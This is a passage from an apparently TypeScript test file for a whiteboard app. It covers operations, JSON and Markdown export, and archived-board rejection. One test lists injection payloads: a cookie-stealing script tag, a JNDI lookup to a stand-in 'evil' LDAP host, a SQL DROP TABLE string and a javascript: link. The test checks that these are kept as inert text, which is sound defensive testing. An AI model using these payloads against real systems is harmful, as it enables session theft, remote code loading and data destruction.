          authorRef: "owner",
        },
      }),
    ).toThrow();
  });

  it("injection-like content is stored and exported as inert data", () => {
    const payloads = [
      "<script>alert(document.cookie)</script>",
      "{{7*7}} ${jndi:ldap://evil}",
      "'; DROP TABLE whiteboards; --",
      "![x](javascript:alert(1))",
    ];
    const ops: WhiteboardOp[] = payloads.map((content, i) => ({
      op: "addNode",
      node: textNode(`n-${i}`, content),
    }));
    const res = applyWhiteboardOps({
      board: makeBoard(),
      ops,
      expectedVersion: 4,
      editToken: "tok-a",
      nowMs: NOW,
    });
    expect(res.ok).toBe(true);
    if (!res.ok) return;

    const json = exportWhiteboardJson(res.board);
    const parsed = JSON.parse(json.body);
    expect(parsed.nodes.map((n: { content: string }) => n.content)).toEqual(
      payloads,
    ); // verbatim, round-trips as data

    const md = exportWhiteboardMarkdown(res.board);
    for (const p of payloads) expect(md.body).toContain(p); // text, never evaluated
    expect(res.board.nodes.every((n) => n.kind === "text")).toBe(true);
  });

  it("archived boards reject further op batches", () => {
    const res = applyWhiteboardOps({
      board: makeBoard({ status: "archived" }),
      ops: [{ op: "addNode", node: textNode("n1") }],
      expectedVersion: 4,
      editToken: "tok-a",
      nowMs: NOW,
    });
    expect(res).toEqual({ ok: false, error: { error: "archived" } });
  });
});
